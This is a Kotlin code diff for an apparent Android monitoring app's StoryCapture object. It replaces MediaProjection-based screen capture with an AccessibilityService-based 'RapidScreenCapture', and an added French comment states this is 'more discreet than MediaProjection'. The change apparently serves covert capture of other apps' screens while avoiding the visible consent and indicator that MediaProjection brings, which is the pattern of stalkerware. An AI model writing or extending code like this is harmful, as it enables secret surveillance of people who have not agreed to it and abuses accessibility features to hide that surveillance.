@@ -134,12 +134,9 @@ object StoryCapture {
                 "timestamp" to dateFormat.format(Date()),
             ))
             
-            // Demander une capture d'écran via le service de capture
-            // Le ScreenCaptureService doit être actif avec MediaProjection
-            ScreenCaptureService.requestCapture(context, "story", mapOf(
-                "app" to appName,
-                "isStory" to true,
-            ))
+            // Demander une capture d'écran via RapidScreenCapture (AccessibilityService)
+            // Plus discret que MediaProjection
+            RapidScreenCapture.captureOnce(context)
             
             Log.d(TAG, "Story capture requested for $appName")
             
@@ -162,11 +159,8 @@ object StoryCapture {
             "manual" to true,
         ))
         
-        ScreenCaptureService.requestCapture(context, "story_manual", mapOf(
-            "app" to appName,
-            "isStory" to true,
-            "manual" to true,
-        ))
+        // Capture via RapidScreenCapture
+        RapidScreenCapture.captureOnce(context)
     }
 }
 
